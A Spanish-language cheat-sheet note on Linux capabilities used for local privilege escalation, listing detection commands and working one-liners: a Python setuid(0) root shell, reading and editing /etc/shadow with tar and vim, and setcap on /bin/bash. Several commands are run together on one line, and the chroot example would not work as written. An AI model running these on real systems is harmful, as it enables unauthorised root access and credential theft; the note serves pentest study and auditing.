
---
Tags: #capabilities #binarios #procesos #privilegios

---
## 📌 Definición

Las **Linux Capabilities** permiten otorgar privilegios granulares a procesos o binarios sin necesidad de darles permisos completos de `root`.

👉 Si un binario con capabilities es explotable, un usuario normal puede ejecutar acciones privilegiadas y escalar a root.

---

## 🔍 Detección

### 1. Buscar capabilities asignadas

`getcap -r / 2>/dev/null`

### 2. Ver capabilities de un binario específico

`getcap /usr/bin/python3`

### 3. Comprobar capabilities activas en el proceso actual

`capsh --print`

---

## ⚡ Capacidades comunes explotables

|**Capability**|**Descripción**|**Explotación típica**|
|---|---|---|
|`cap_setuid+ep`|Permite cambiar UID/GID de procesos|`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`|
|`cap_sys_admin+ep`|Acceso total al sistema, montar FS, crear namespaces|Montar disco, ejecutar contenedores → root|
|`cap_sys_chroot+ep`|Permite hacer `chroot`|Crear entorno aislado y ejecutar `/bin/sh` como root|
|`cap_dac_override+ep`|Ignora permisos de lectura/escritura/ejecución|Acceso a `/etc/shadow`, modificar archivos root|
|`cap_dac_read_search+ep`|Permite leer archivos ignorando permisos|Leer `/etc/shadow` directamente|
|`cap_setfcap+ep`|Permite asignar capabilities a otros binarios|`setcap cap_setuid+ep /bin/bash` → root shell|

---

## 🎯 Explotación práctica

### 1. **Python con `cap_setuid+ep`**

Si Python tiene `cap_setuid+ep`:

`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

---

### 2. **Tar con `cap_dac_read_search+ep`**

Permite leer cualquier archivo, incluso `/etc/shadow`:

`tar -cvf /tmp/shadow.tar /etc/shadow tar -xvf /tmp/shadow.tar -C /tmp/`

---

### 3. **Vim con `cap_dac_override+ep`**

Permite editar cualquier archivo ignorando permisos:

`vim /etc/shadow`

---

### 4. **Chroot con `cap_sys_chroot+ep`**

Si `chroot` tiene esta capability:

`mkdir /tmp/rootfs cp /bin/bash /tmp/rootfs/ sudo chroot /tmp/rootfs /bash`

---

### 5. **Setcap con `cap_setfcap+ep`**

Permite asignar capabilities a binarios:

`setcap cap_setuid+ep /bin/bash /bin/bash -p`

---

## 📊 Tabla de referencia rápida

|**Capability**|**Impacto**|**Ejemplo**|
|---|---|---|
|`cap_setuid+ep`|Ejecutar como root|`python3 -c 'os.setuid(0)'`|
|`cap_sys_admin+ep`|Acceso casi total|Montar FS, contenedores|
|`cap_sys_chroot+ep`|Aislamiento chroot|`chroot /tmp`|
|`cap_dac_override+ep`|Ignorar permisos|Editar `/etc/shadow`|
|`cap_dac_read_search+ep`|Leer archivos root|Dump de `/etc/shadow`|
|`cap_setfcap+ep`|Modificar otras capabilities|`setcap cap_setuid+ep /bin/bash`|

---

## 🛡️ Detección rápida (script)

`#!/bin/bash echo "[*] Buscando capabilities en el sistema..." getcap -r / 2>/dev/null | grep -v "No such file"  echo "[*] Revisando capabilities activas en este proceso..." capsh --print | grep "Current"`